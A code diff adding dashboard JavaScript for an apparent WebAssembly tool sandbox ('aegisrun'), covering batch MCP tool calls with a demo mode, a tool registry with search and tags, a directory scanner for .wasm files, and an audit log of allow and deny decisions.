+    countEl.textContent = t('mcp_selected_n').replace('{n}', cbs.length);
+  } else {
+    bar.style.display = 'none';
+  }
+  // Update select-all state
+  const allCbs = document.querySelectorAll('.mcp-tool-cb');
+  const selectAll = document.getElementById('mcp-select-all');
+  if (selectAll) selectAll.checked = allCbs.length > 0 && cbs.length === allCbs.length;
+}
+
+function clearMcpSelection() {
+  document.querySelectorAll('.mcp-tool-cb').forEach(cb => { cb.checked = false; });
+  document.getElementById('mcp-select-all').checked = false;
+  updateMcpBatchBar();
+}
+
+function batchCallMcpTools() {
+  const cbs = document.querySelectorAll('.mcp-tool-cb:checked');
+  if (!cbs.length) { alert(t('mcp_no_selection')); return; }
+  const resultEl = document.getElementById('mcp-call-result');
+  const toolCalls = [];
+  cbs.forEach(cb => {
+    const name = cb.value;
+    const args = mcpToolArgs[name] || '{}';
+    try {
+      toolCalls.push({ name: name, args: JSON.parse(args) });
+    } catch(e) {
+      toolCalls.push({ name: name, args: {} });
+    }
+  });
+  // Demo mode: show all request payloads
+  if (mcpDemoMode) {
+    let h = '<div style="margin-bottom:8px;padding:8px 12px;background:#3b2e1a;border:1px solid var(--orange);border-radius:6px;font-size:12px;color:var(--orange);font-weight:600">';
+    h += t('mcp_mode_demo') + ' — ' + t('mcp_mode_demo_desc') + '</div>';
+    toolCalls.forEach((tc, i) => {
+      const payload = { jsonrpc: '2.0', id: Date.now() + i, method: 'tools/call', params: { name: tc.name, arguments: tc.args } };
+      h += '<div style="font-size:11px;color:var(--dim);margin-top:8px">[' + (i+1) + '] POST /mcp — ' + escHtml(tc.name.replace('aegisrun.', '')) + '</div>';
+      h += '<pre>' + escHtml(JSON.stringify(payload, null, 2)) + '</pre>';
+    });
+    resultEl.innerHTML = h;
+    return;
+  }
+  // Real mode: call all tools
+  resultEl.innerHTML = '<span style="color:var(--dim)">' + t('mcp_batch_calling') + '</span>';
+  const promises = toolCalls.map((tc, i) =>
+    fetch('/mcp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ jsonrpc: '2.0', id: Date.now() + i, method: 'tools/call', params: { name: tc.name, arguments: tc.args } })
+    }).then(r => r.json()).then(d => ({ name: tc.name, result: d }))
+    .catch(e => ({ name: tc.name, error: e.message || 'Failed' }))
+  );
+  Promise.all(promises).then(results => {
+    let h = '';
+    results.forEach((r, i) => {
+      h += '<div style="margin-bottom:10px;border-left:3px solid ' + (r.error ? 'var(--red)' : 'var(--green)') + ';padding-left:10px">';
+      h += '<div style="font-weight:600;color:var(--accent);font-size:13px">[' + (i+1) + '] ' + escHtml(r.name.replace('aegisrun.', '')) + '</div>';
+      if (r.error) {
+        h += '<pre style="color:var(--red)">' + escHtml(r.error) + '</pre>';
+      } else if (r.result && r.result.result && r.result.result.content) {
+        const text = r.result.result.content.map(c => c.text || '').join('\n');
+        try { h += '<pre>' + escHtml(JSON.stringify(JSON.parse(text), null, 2)) + '</pre>'; }
+        catch(e) { h += '<pre>' + escHtml(text) + '</pre>'; }
+      } else {
+        h += '<pre>' + escHtml(JSON.stringify(r.result, null, 2)) + '</pre>';
+      }
+      h += '</div>';
+    });
+    resultEl.innerHTML = h;
+    fetchAudit();
+  });
+}
+
+// ── Tool Registry ──
+let toolRegistryData = [];
+
+function fetchToolRegistry() {
+  fetch('/api/tools').then(r => r.json()).then(d => {
+    toolRegistryData = d.tools || [];
+    renderToolRegistry(toolRegistryData);
+    renderExampleTools();
+    fetchToolTags();
+  }).catch(() => {
+    document.getElementById('tool-registry-list').innerHTML = '<span style="color:var(--dim)">Failed to load</span>';
+  });
+}
+
+function fetchToolTags() {
+  fetch('/api/tools/tags').then(r => r.json()).then(d => {
+    const tags = d.tags || [];
+    const cloud = document.getElementById('tool-tag-cloud');
+    if (!tags.length) { cloud.innerHTML = ''; return; }
+    cloud.innerHTML = '<span style="font-size:11px;color:var(--dim);margin-right:6px">' + t('tag_cloud_title') + ':</span>' +
+      tags.map(tag => '<span class="tag-cloud-item" onclick="searchToolsByTag(\'' + escHtml(tag) + '\')">' + escHtml(tag) + '</span>').join('');
+  }).catch(() => {});
+}
+
+function renderToolRegistry(tools) {
+  const el = document.getElementById('tool-registry-list');
+  if (!tools.length) {
+    el.innerHTML = '<div style="color:var(--dim);font-size:13px;padding:12px 0">' + t('no_tools') + '</div>';
+    return;
+  }
+  el.innerHTML = tools.map(tool => {
+    const tags = (tool.tags || []).map(tg => '<span class="tag">' + escHtml(tg) + '</span>').join('');
+    return '<div class="tool-reg-card">' +
+      '<div class="tool-reg-header">' +
+        '<div><div class="tool-reg-name">' + escHtml(tool.tool_id) + '</div>' +
+        '<div class="tool-reg-meta">' + escHtml(tool.description || '') + ' &middot; v' + escHtml(tool.version) + ' &middot; ' + escHtml(tool.publisher) + '</div></div>' +
+        '<button class="btn btn-danger" style="font-size:11px;padding:3px 10px" onclick="unregisterTool(\'' + escHtml(tool.tool_id) + '\')">&times;</button>' +
+      '</div>' +
+      (tags ? '<div class="tool-reg-tags">' + tags + '</div>' : '') +
+    '</div>';
+  }).join('');
+}
+
+function searchTools() {
+  const kw = document.getElementById('tool-search').value.trim();
+  if (!kw) { renderToolRegistry(toolRegistryData); return; }
+  fetch('/api/tools/search?keyword=' + encodeURIComponent(kw))
+    .then(r => r.json()).then(d => renderToolRegistry(d.results || []))
+    .catch(() => {});
+}
+
+function searchToolsByTag(tag) {
+  document.getElementById('tool-search').value = tag;
+  fetch('/api/tools/search?tag=' + encodeURIComponent(tag))
+    .then(r => r.json()).then(d => renderToolRegistry(d.results || []))
+    .catch(() => {});
+}
+
+function registerTool() {
+  const toolId = document.getElementById('reg-tool-id').value.trim();
+  const publisher = document.getElementById('reg-publisher').value.trim();
+  const version = document.getElementById('reg-version').value.trim() || '1.0.0';
+  const wasmPath = document.getElementById('reg-wasm-path').value.trim();
+  const description = document.getElementById('reg-description').value.trim();
+  const tagsStr = document.getElementById('reg-tags').value.trim();
+  const tags = tagsStr ? tagsStr.split(',').map(s => s.trim()).filter(Boolean) : [];
+  const resultEl = document.getElementById('reg-result');
+
+  if (!toolId || !publisher) {
+    resultEl.innerHTML = '<span style="color:var(--red)">Tool ID and Publisher required</span>';
+    return;
+  }
+
+  const body = { tool_id: toolId, publisher: publisher, version: version, description: description, tags: tags };
+  if (wasmPath) body.wasm_path = wasmPath;
+
+  fetch('/api/tools/register', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body)
+  }).then(r => r.json()).then(d => {
+    if (d.error) {
+      resultEl.innerHTML = '<span style="color:var(--red)">' + t('tool_reg_failed') + ': ' + escHtml(d.error) + '</span>';
+    } else {
+      resultEl.innerHTML = '<span style="color:var(--green)">' + t('tool_reg_success') + '</span>';
+      document.getElementById('reg-tool-id').value = '';
+      document.getElementById('reg-description').value = '';
+      document.getElementById('reg-wasm-path').value = '';
+      document.getElementById('reg-tags').value = '';
+      fetchToolRegistry();
+    }
+  }).catch(() => {
+    resultEl.innerHTML = '<span style="color:var(--red)">' + t('tool_reg_failed') + '</span>';
+  });
+}
+
+function unregisterTool(toolId) {
+  if (!confirm(t('tool_unreg_confirm'))) return;
+  fetch('/api/tools/unregister', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({tool_id: toolId})
+  }).then(r => r.json()).then(d => {
+    if (d.error) {
+      alert('Error: ' + d.error);
+    } else {
+      fetchToolRegistry();
+    }
+  }).catch(() => {});
+}
+
+// ── Example Tools & Directory Scanner ──
+const EXAMPLE_TOOLS = [
+  { tool_id: 'weather-query', publisher: '@aegisrun', version: '1.0.0', description: '查询指定城市的天气信息', description_en: 'Query weather for a city', tags: ['api', 'weather', 'net'] },
+  { tool_id: 'file-search', publisher: '@aegisrun', version: '1.2.0', description: '在指定目录中搜索文件', description_en: 'Search files in a directory', tags: ['file', 'search', 'fs'] },
+  { tool_id: 'code-executor', publisher: '@moonbit-official', version: '0.9.0', description: '在沙箱中安全执行代码', description_en: 'Execute code safely in sandbox', tags: ['sandbox', 'exec', 'security'] },
+];
+
+function renderExampleTools() {
+  const el = document.getElementById('example-tools-list');
+  if (!el) return;
+  const desc = t('example_tools_desc');
+  let h = '<div style="font-size:12px;color:var(--dim);margin-bottom:10px;line-height:1.6">' + escHtml(desc) + '</div>';
+  h += EXAMPLE_TOOLS.map((tool, i) => {
+    const tags = tool.tags.map(tg => '<span class="tag" style="background:#1a2332;color:var(--accent);border:1px solid var(--border);font-size:11px">' + escHtml(tg) + '</span>').join('');
+    const isReg = toolRegistryData.some(r => r.tool_id === tool.tool_id);
+    const descText = currentLang === 'en' ? (tool.description_en || tool.description) : tool.description;
+    return '<div class="tool-reg-card" style="margin-bottom:8px">' +
+      '<div style="display:flex;justify-content:space-between;align-items:flex-start">' +
+        '<div style="flex:1">' +
+          '<div class="tool-reg-name">' + escHtml(tool.tool_id) + '</div>' +
+          '<div class="tool-reg-meta">' + escHtml(descText) + ' &middot; v' + escHtml(tool.version) + ' &middot; ' + escHtml(tool.publisher) + '</div>' +
+          '<div style="margin-top:4px">' + tags + '</div>' +
+        '</div>' +
+        '<button class="btn ' + (isReg ? 'btn-purple' : 'btn-green') + '" style="font-size:11px;padding:3px 12px;flex-shrink:0;margin-left:10px" onclick="registerExampleTool(' + i + ')"' + (isReg ? ' disabled' : '') + '>' +
+          (isReg ? t('scan_dir_registered') : t('btn_register')) +
+        '</button>' +
+      '</div>' +
+    '</div>';
+  }).join('');
+  el.innerHTML = h;
+}
+
+function registerExampleTool(idx) {
+  const tool = EXAMPLE_TOOLS[idx];
+  if (!tool) return;
+  fetch('/api/tools/register', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      tool_id: tool.tool_id,
+      publisher: tool.publisher,
+      version: tool.version,
+      description: tool.description,
+      tags: tool.tags
+    })
+  }).then(r => r.json()).then(d => {
+    if (d.error) {
+      alert(t('tool_reg_failed') + ': ' + d.error);
+    } else {
+      fetchToolRegistry();
+      setTimeout(renderExampleTools, 300);
+    }
+  }).catch(() => alert(t('tool_reg_failed')));
+}
+
+let scannedFiles = [];
+
+function scanDir() {
+  const pathInput = document.getElementById('scan-dir-path');
+  const resultsEl = document.getElementById('scan-dir-results');
+  const actionsEl = document.getElementById('scan-dir-actions');
+  const dirPath = pathInput.value.trim();
+  if (!dirPath) { pathInput.focus(); return; }
+  resultsEl.innerHTML = '<span style="color:var(--dim)">' + t('scan_dir_scanning') + '</span>';
+  actionsEl.style.display = 'none';
+  fetch('/api/tools/scan-dir', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ path: dirPath })
+  }).then(r => r.json()).then(d => {
+    if (d.error) {
+      resultsEl.innerHTML = '<span style="color:var(--red)">' + escHtml(d.error) + '</span>';
+      return;
+    }
+    const files = d.files || [];
+    if (!files.length) {
+      resultsEl.innerHTML = '<span style="color:var(--dim)">' + t('scan_dir_empty') + '</span>';
+      return;
+    }
+    scannedFiles = files;
+    resultsEl.innerHTML = '<div style="font-size:12px;color:var(--green);margin-bottom:8px">' + t('scan_dir_found').replace('{n}', files.length) + '</div>' +
+      files.map((f, i) => {
+        const isReg = toolRegistryData.some(r => r.tool_id === f.name.replace('.wasm', ''));
+        return '<label style="display:flex;align-items:center;gap:8px;padding:6px 0;cursor:pointer;border-bottom:1px solid var(--border)">' +
+          '<input type="checkbox" class="scan-file-cb" data-idx="' + i + '" style="width:auto;margin:0;accent-color:var(--accent)" onchange="updateScanSelectedCount()"' + (isReg ? ' disabled' : '') + '>' +
+          '<span style="flex:1;font-size:13px;font-family:monospace">' + escHtml(f.name) + ' <span style="color:var(--dim);font-size:11px">(' + escHtml(f.size_human) + ')</span></span>' +
+          (isReg ? '<span style="font-size:11px;color:var(--purple)">' + t('scan_dir_already') + '</span>' : '') +
+        '</label>';
+      }).join('');
+    // Show batch register button if there are unregistered files
+    const hasUnreg = files.some((f) => !toolRegistryData.some(r => r.tool_id === f.name.replace('.wasm', '')));
+    if (hasUnreg) actionsEl.style.display = 'block';
+    updateScanSelectedCount();
+  }).catch(() => {
+    resultsEl.innerHTML = '<span style="color:var(--red)">' + t('scan_failed') + '</span>';
+  });
+}
+
+function updateScanSelectedCount() {
+  const cbs = document.querySelectorAll('.scan-file-cb:not(:disabled):checked');
+  const countEl = document.getElementById('scan-selected-count');
+  if (countEl) countEl.textContent = cbs.length + ' selected';
+}
+
+function batchRegisterScanned() {
+  const cbs = document.querySelectorAll('.scan-file-cb:not(:disabled):checked');
+  if (!cbs.length) return;
+  const dirPath = document.getElementById('scan-dir-path').value.trim();
+  const tools = [];
+  cbs.forEach(cb => {
+    const f = scannedFiles[parseInt(cb.dataset.idx)];
+    if (f) {
+      const sep = dirPath.endsWith('\\') || dirPath.endsWith('/') ? '' : '\\';
+      tools.push({
+        tool_id: f.name.replace('.wasm', ''),
+        publisher: '@aegisrun',
+        version: '1.0.0',
+        description: f.name,
+        wasm_path: dirPath + sep + f.name,
+        tags: ['wasm', 'local']
+      });
+    }
+  });
+  const resultsEl = document.getElementById('scan-dir-results');
+  resultsEl.innerHTML = '<span style="color:var(--dim)">' + t('mcp_batch_calling') + '</span>';
+  fetch('/api/tools/batch-register', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ tools: tools })
+  }).then(r => r.json()).then(d => {
+    if (d.error) {
+      resultsEl.innerHTML = '<span style="color:var(--red)">' + t('batch_reg_fail') + ': ' + escHtml(d.error) + '</span>';
+    } else {
+      const msg = t('batch_reg_ok').replace('{ok}', d.ok).replace('{total}', d.total);
+      let h = '<div style="color:var(--green);margin-bottom:8px">' + msg + '</div>';
+      if (d.results) {
+        d.results.forEach(r => {
+          const color = r.ok ? 'var(--green)' : 'var(--red)';
+          h += '<div style="font-size:12px;color:' + color + ';padding:2px 0">' + (r.ok ? '✓' : '✗') + ' ' + escHtml(r.tool_id) + (r.error ? ' — ' + escHtml(r.error) : '') + '</div>';
+        });
+      }
+      resultsEl.innerHTML = h;
+      fetchToolRegistry();
+      setTimeout(() => { scanDir(); }, 500);
+    }
+  }).catch(() => {
+    resultsEl.innerHTML = '<span style="color:var(--red)">' + t('batch_reg_fail') + '</span>';
+  });
+}
+
 // ── Audit ──
 function fetchAudit(){
   fetch('/api/audit').then(r=>r.json()).then(function(list){
     var h='';
-    list.forEach(function(a){
-      var ts=new Date(parseInt(a.timestamp)*1000).toLocaleString();
-      var c=a.decision==='DENY'?'log-block':'log-allow';
-      h+=`<div class="log-line ${c}"><strong>${ts}</strong> [${escHtml(a.tool_id)}] ${escHtml(a.action)} <span style="color:${a.decision==='DENY'?'var(--red)':'var(--green)'}">${a.decision}</span> ${escHtml(a.reason)}</div>`;
-    });
+    if (!list.length) {
+      h = '<div style="color:var(--dim);font-size:13px;padding:20px 0;text-align:center">' + t('audit_empty') + '</div>';
+    } else {
+      list.forEach(function(a){
+        var ts=new Date(parseInt(a.timestamp)*1000).toLocaleString();
+        var c=a.decision==='DENY'?'log-block':'log-allow';
+        h+=`<div class="log-line ${c}"><strong>${ts}</strong> [${escHtml(a.tool_id)}] ${escHtml(a.action)} <span style="color:${a.decision==='DENY'?'var(--red)':'var(--green)'}">${a.decision}</span> ${escHtml(a.reason)}</div>`;
+      });
+    }
     document.getElementById('audit-log').innerHTML=h;
   }).catch(function(){});
 }
@@ -476,9 +1389,12 @@ function escHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').
 
 // ── Init ──
 applyI18n();
+renderScenarios();
 fetchPolicy();
 fetch('/api/defense').then(r=>r.json()).then(d=>{if(policy)policy.defense=d;renderDefense();}).catch(()=>{});
 fetchAudit();
+fetchToolRegistry();
+setTimeout(renderExampleTools, 500);
 setInterval(fetchAudit, 8000);
 </script>
 </body>
